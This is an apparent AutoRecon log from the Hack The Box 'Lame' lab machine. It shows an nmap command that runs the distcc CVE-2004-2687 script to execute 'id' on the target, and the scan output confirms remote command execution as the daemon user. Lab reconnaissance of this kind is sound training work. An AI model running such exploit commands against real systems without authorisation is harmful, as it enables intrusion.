```bash
nmap -vv --reason -Pn -T4 -sV -p 3632 --script="banner,distcc-cve2004-2687" --script-args="distcc-cve2004-2687.cmd=id" -oN "/HTB-boxes/lame/misc-tools/autorecon/10.10.10.3/scans/tcp3632/tcp_3632_distcc_nmap.txt" -oX "/HTB-boxes/lame/misc-tools/autorecon/10.10.10.3/scans/tcp3632/xml/tcp_3632_distcc_nmap.xml" 10.10.10.3
```

[/HTB-boxes/lame/misc-tools/autorecon/10.10.10.3/scans/tcp3632/tcp_3632_distcc_nmap.txt](file:///HTB-boxes/lame/misc-tools/autorecon/10.10.10.3/scans/tcp3632/tcp_3632_distcc_nmap.txt):

```
# Nmap 7.92 scan initiated Tue Mar 15 21:44:41 2022 as: nmap -vv --reason -Pn -T4 -sV -p 3632 --script=banner,distcc-cve2004-2687 --script-args=distcc-cve2004-2687.cmd=id -oN /HTB-boxes/lame/misc-tools/autorecon/10.10.10.3/scans/tcp3632/tcp_3632_distcc_nmap.txt -oX /HTB-boxes/lame/misc-tools/autorecon/10.10.10.3/scans/tcp3632/xml/tcp_3632_distcc_nmap.xml 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.28s latency).
Scanned at 2022-03-15 21:44:41 EDT for 18s

PORT     STATE SERVICE REASON         VERSION
3632/tcp open  distccd syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://distcc.github.io/security.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 15 21:44:59 2022 -- 1 IP address (1 host up) scanned in 18.09 seconds

```
